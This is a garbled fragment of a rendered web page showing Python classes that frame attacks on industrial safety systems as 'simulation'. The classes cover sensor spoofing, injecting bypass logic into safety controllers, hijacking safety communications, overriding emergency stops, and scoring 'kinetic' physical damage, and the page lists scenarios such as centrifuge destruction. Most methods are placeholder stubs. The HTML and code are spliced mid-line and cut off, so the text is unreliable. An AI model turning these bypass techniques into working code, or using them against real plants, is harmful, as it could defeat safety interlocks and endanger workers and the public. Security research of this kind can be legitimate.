class=\"pl-c\"\u003e# Implementation would analyze detection system effectiveness\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0.15\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# 15% detection probability for simulation\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecalculate_environmental_damage\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Assess environmental impact of material release\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'containment_breach'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'ecosystem_impact'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Moderate'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'regulatory_violations'\u003c/span\u003e: [\u003cspan class=\"pl-s\"\u003e'EPA Clean Water Act'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'OSHA Process Safety'\u003c/span\u003e]\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003echeck_safety_systems\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Evaluate safety system response to abnormal conditions\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'high_level_alarm'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Activated'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'emergency_shutdown'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Initiated'\u003c/span\u003e, \n            \u003cspan class=\"pl-s\"\u003e'secondary_containment'\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Engaged'\u003c/span\u003e\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eanalyze_kinetic_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Comprehensive analysis of kinetic attack consequences\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eanalysis\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'risk_level'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_risk_level\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'business_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_business_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'safety_implications'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eevaluate_safety_implications\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'recovery_requirements'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eplan_recovery_operations\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e)\n        }\n        \u003cspan class=\"pl-s1\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eanalysis\u003c/span\u003e\n    \u003cspan class=\"pl-s\"\u003e``\u003c/span\u003e`\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eSimulation Scenarios:\u003c/strong\u003e\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eCentrifuge destruction data-snippet-clipboard-copy-content=\"class SafetySystemBypass:\n    def __init__(self, safety_config):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL SAFETY NOTICE: This class simulates safety system bypass techniques\n        for authorized security research and defensive testing ONLY.\n        \n        AUTHORIZED USE CASES:\n        - Safety system resilience testing in isolated environments\n        - Red team exercises with proper oversight and authorization\n        - Defensive control improvement and detection enhancement\n        - Risk assessment of safety instrumented systems (SIS)\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational safety systems\n        - Do not deploy in production environments\n        - Ensure proper isolation and containment during testing\n        - Follow all safety protocols and have emergency procedures in place\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - IEC 61508/61511 functional safety standards\n        - ISA 84 safety instrumented systems guidelines\n        - NIST SP 800-82 industrial control system security\n        \u0026quot;\u0026quot;\u0026quot;\n        self.config = safety_config\n        self.safety_systems = self.initialize_safety_systems()\n\n    def simulate_safety_bypass_attacks(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive safety system bypass simulation with statistical analysis.\n        Returns success rates for each bypass technique across multiple trials.\n        \u0026quot;\u0026quot;\u0026quot;\n        bypass_techniques = [\n            self.sensor_spoofing_bypass,\n            self.logic_manipulation_bypass, \n            self.communication_hijacking_bypass,\n            self.physical_override_bypass\n        ]\n        \n        success_rates = {}\n        for technique in bypass_techniques:\n            success_count = 0\n            trials = 100  # Statistical significance with 100 trials\n            \n            for trial in range(trials):\n                if technique():\n                    success_count += 1\n            \n            # Calculate success rate percentage\n            success_rates[technique.__name__] = success_count / trials\n        \n        return success_rates\n\n    def sensor_spoofing_bypass(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Simulate sensor spoofing attack by overriding sensor values to show false safe conditions.\n        This technique tests the safety system's ability to detect sensor manipulation.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Real-world dangerous condition that should trigger safety response\n        actual_temperature = 150  # °C - Above safety threshold (dangerous condition)\n        spoofed_temperature = 80  # °C - Below safety threshold (spoofed safe condition)\n        \n        # Override sensor reading to bypass safety monitoring\n        self.override_sensor_value('temperature_sensor', spoofed_temperature)\n        \n        # Test if safety system detects the spoofing anomaly\n        anomaly_detected = self.safety_system_detects_anomaly()\n        \n        # Success: Safety system does NOT detect the spoofing\n        return not anomaly_detected\n\n    def logic_manipulation_bypass(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Simulate safety logic manipulation by modifying safety function code.\n        Tests the integrity protection mechanisms of safety logic systems.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Read original safety logic for baseline\n        original_logic = self.read_safety_logic()\n        \n        # Inject malicious bypass code into safety logic\n        modified_logic = self.inject_safety_bypass(original_logic)\n        \n        # Deploy modified logic to safety controller\n        self.write_safety_logic(modified_logic)\n        \n        # Test if the bypass effectively disables safety functions\n        bypass_effective = self.test_safety_bypass()\n        \n        return bypass_effective\n\n    def communication_hijacking_bypass(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Simulate safety communication network hijacking attacks.\n        Tests protection of safety bus communications and message integrity.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Intercept safety system communications\n        safety_messages = self.intercept_safety_communications()\n        \n        # Modify safety-critical messages\n        modified_messages = self.modify_safety_messages(safety_messages)\n        \n        # Inject false safety status messages\n        injection_success = self.inject_false_safety_status(modified_messages)\n        \n        return injection_success\n\n    def physical_override_bypass(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Simulate physical manipulation of safety system components.\n        Tests physical security and tamper detection mechanisms.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Bypass physical safety interlocks\n        interlock_bypassed = self.bypass_safety_interlocks()\n        \n        # Override emergency stop circuits\n        estop_override = self.override_emergency_stop()\n        \n        # Manipulate safety relay logic\n        relay_manipulation = self.manipulate_safety_relays()\n        \n        return interlock_bypassed or estop_override or relay_manipulation\n\n    def override_sensor_value(self, sensor_name, spoofed_value):\n        \u0026quot;\u0026quot;\u0026quot;Override sensor reading with spoofed value for testing\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would interface with sensor simulation\n        pass\n\n    def safety_system_detects_anomaly(self):\n        \u0026quot;\u0026quot;\u0026quot;Check if safety system detects sensor spoofing anomaly\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would check safety system diagnostics\n        return False  # Placeholder for simulation\n\n    def read_safety_logic(self):\n        \u0026quot;\u0026quot;\u0026quot;Read current safety logic configuration\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would read from safety controller\n        return \u0026quot;original_safety_logic\u0026quot;\n\n    def inject_safety_bypass(self, logic):\n        \u0026quot;\u0026quot;\u0026quot;Inject bypass code into safety logic\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would modify safety logic\n        return \u0026quot;modified_safety_logic_with_bypass\u0026quot;\n\n    def write_safety_logic(self, modified_logic):\n        \u0026quot;\u0026quot;\u0026quot;Write modified safety logic to controller\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would write to safety controller\n        pass\n\n    def test_safety_bypass(self):\n        \u0026quot;\u0026quot;\u0026quot;Test if safety bypass is effective\u0026quot;\u0026quot;\u0026quot;\n        # Implementation would verify bypass effectiveness\n        return True  # Placeholder for simulation\n status messages\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003einjection_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einject_false_safety_status\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003emodified_messages\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einjection_success\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ephysical_override_bypass\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Simulate physical manipulation of safety system components.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Tests physical security and tamper detection mechanisms.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Bypass physical safety interlocks\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003einterlock_bypassed\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ebypass_safety_interlocks\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Override emergency stop circuits\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eestop_override\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eoverride_emergency_stop\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Manipulate safety relay logic\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003erelay_manipulation\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emanipulate_safety_relays\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einterlock_bypassed\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eestop_override\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erelay_manipulation\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eoverride_sensor_value\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003esensor_name\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003espoofed_value\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Override sensor reading with spoofed value for testing\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would interface with sensor simulation\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003epass\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esafety_system_detects_anomaly\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Check if safety system detects sensor spoofing anomaly\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would check safety system diagnostics\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Placeholder for simulation\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eread_safety_logic\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Read current safety logic configuration\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would read from safety controller\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"original_safety_logic\"\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003einject_safety_bypass\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003elogic\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Inject bypass code into safety logic\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would modify safety logic\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"modified_safety_logic_with_bypass\"\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ewrite_safety_logic\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003emodified_logic\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Write modified safety logic to controller\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would write to safety controller\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003epass\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003etest_safety_bypass\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Test if safety bypass is effective\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Implementation would verify bypass effectiveness\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Placeholder for simulation\u003c/span\u003e\n        \u003cspan class=\"pl-s\"\u003e``\u003c/span\u003e`\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eBypass Methods:\u003c/strong\u003e\u003c/p\u003e\n\u003cul 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"class PhysicalImpactSimulator:\n    def __init__(self, physical_model):\n        self.model = physical_model\n        self.impact_database = self.load_impact_metrics()\n\n    def simulate_kinetic_effects(self, attack_scenario):\n        \u0026quot;\u0026quot;\u0026quot;Comprehensive physical impact simulation with cascading effects\u0026quot;\u0026quot;\u0026quot;\n        simulation_results = {}\n        \n        # Cascading impact simulation\n        simulation_results['process_impact'] = self.simulate_process_disruption(attack_scenario)\n        simulation_results['equipment_damage'] = self.simulate_equipment_damage(attack_scenario)\n        simulation_results['environmental_impact'] = self.simulate_environmental_impact(attack_scenario)\n        simulation_results['safety_impact'] = self.simulate_safety_impact(attack_scenario)\n        simulation_results['cascading_effects'] = self.simulate_cascading_effects(attack_scenario)\n        \n        return simulation_results\n\n    def simulate_process_disruption(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Enhanced process disruption simulation with economic impact\u0026quot;\u0026quot;\u0026quot;\n        impact_metrics = {\n            'production_loss': self.calculate_production_loss(scenario),\n            'quality_impact': self.calculate_quality_impact(scenario),\n            'downtime_duration': self.calculate_downtime(scenario),\n            'recovery_time': self.calculate_recovery_time(scenario),\n            'economic_impact': self.calculate_economic_loss(scenario),\n            'supply_chain_impact': self.assess_supply_chain_effects(scenario)\n        }\n        return impact_metrics\n\n    def simulate_equipment_damage(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Comprehensive equipment damage assessment\u0026quot;\u0026quot;\u0026quot;\n        damage_assessment = {\n            'mechanical_stress': self.calculate_mechanical_stress(scenario),\n            'thermal_damage': self.calculate_thermal_damage(scenario),\n            'electrical_damage': self.calculate_electrical_damage(scenario),\n            'replacement_cost': self.calculate_replacement_cost(scenario),\n            'repair_timeline': self.estimate_repair_timeline(scenario),\n            'equipment_availability': self.calculate_equipment_availability(scenario)\n        }\n        return damage_assessment\n\n    def simulate_environmental_impact(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Multi-faceted environmental impact simulation\u0026quot;\u0026quot;\u0026quot;\n        environmental_metrics = {\n            'chemical_release': self.calculate_chemical_release(scenario),\n            'air_quality_impact': self.calculate_air_quality_impact(scenario),\n            'water_contamination': self.calculate_water_contamination(scenario),\n            'regulatory_violations': self.identify_regulatory_violations(scenario),\n            'cleanup_costs': self.estimate_cleanup_costs(scenario),\n            'long_term_ecological_impact': self.assess_ecological_impact(scenario)\n        }\n        return environmental_metrics\n\n    def simulate_safety_impact(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Safety system and personnel impact analysis\u0026quot;\u0026quot;\u0026quot;\n        safety_impact = {\n            'safety_system_reliability': self.assess_safety_system_reliability(scenario),\n            'personnel_risk': self.calculate_personnel_risk(scenario),\n            'emergency_response_effectiveness': self.evaluate_emergency_response(scenario),\n            'safety_integrity_level': self.verify_safety_integrity(scenario)\n        }\n        return safety_impact\n\n    def simulate_cascading_effects(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Simulate cascading impacts across interconnected systems\u0026quot;\u0026quot;\u0026quot;\n        cascading_effects = {\n            'interdependent_systems': self.analyze_system_interdependencies(scenario),\n            'critical_infrastructure_impact': self.assess_infrastructure_impact(scenario),\n            'public_health_impact': self.evaluate_public_health_effects(scenario),\n            'socioeconomic_impact': self.analyze_socioeconomic_consequences(scenario)\n        }\n        return cascading_effects\n\n    def calculate_economic_loss(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Calculate comprehensive economic impact\u0026quot;\u0026quot;\u0026quot;\n        # Production loss value\n        production_loss = self.calculate_production_loss(scenario)\n        hourly_production_value = self.model.get('hourly_production_value', 10000)\n        \n        # Equipment damage costs\n        equipment_damage = self.calculate_replacement_cost(scenario)\n        \n        # Environmental cleanup costs\n        cleanup_costs = self.estimate_cleanup_costs(scenario)\n        \n        # Regulatory penalties\n        regulatory_penalties = self.calculate_regulatory_penalties(scenario)\n        \n        total_economic_impact = (\n            (production_loss * hourly_production_value) +\n            equipment_damage +\n            cleanup_costs +\n            regulatory_penalties\n        )\n        \n        return total_economic_impact\n\n    def assess_system_interdependencies(self, scenario):\n        \u0026quot;\u0026quot;\u0026quot;Analyze interconnected system impacts\u0026quot;\u0026quot;\u0026quot;\n        interdependencies = {\n            'utility_dependencies': self.analyze_utility_dependencies(scenario),\n            'supply_chain_dependencies': self.analyze_supply_chain_dependencies(scenario),\n            'infrastructure_dependencies': self.analyze_infrastructure_dependencies(scenario),\n            'regulatory_reporting_dependencies': self.analyze_regulatory_dependencies(scenario)\n        }\n        return interdependencies\n        ```\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003ePhysicalImpactSimulator\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ephysical_model\u003c/span\u003e):\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emodel\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ephysical_model\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eimpact_database\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eload_impact_metrics\u003c/span\u003e()\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_kinetic_effects\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eattack_scenario\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Comprehensive physical impact simulation with cascading effects\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-c\"\u003e# Cascading impact simulation\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'process_impact'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_process_disruption\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_scenario\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'equipment_damage'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_equipment_damage\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_scenario\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'environmental_impact'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_environmental_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_scenario\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'safety_impact'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_safety_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_scenario\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'cascading_effects'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003esimulate_cascading_effects\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eattack_scenario\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esimulation_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_process_disruption\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Enhanced process disruption simulation with economic impact\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eimpact_metrics\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'production_loss'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_production_loss\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'quality_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_quality_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'downtime_duration'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_downtime\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'recovery_time'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_recovery_time\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'economic_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_supply_chain_effects\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        }\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e class=\"pl-en\"\u003esimulate_environmental_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e):\n class=\"pl-c1\"\u003eidentify_regulatory_violations\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'cleanup_costs'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestimate_cleanup_costs\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'long_term_ecological_impact'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_ecological_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e)\n        }\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eenvironmental_metrics\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003esimulate_safety_impact\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"Safety system and personnel impact analysis\"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003esafety_impact\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'safety_system_reliability'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_safety_system_reliability\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'personnel_risk'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_personnel_risk\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003escenario\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'emergency_response_effectiveness'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan 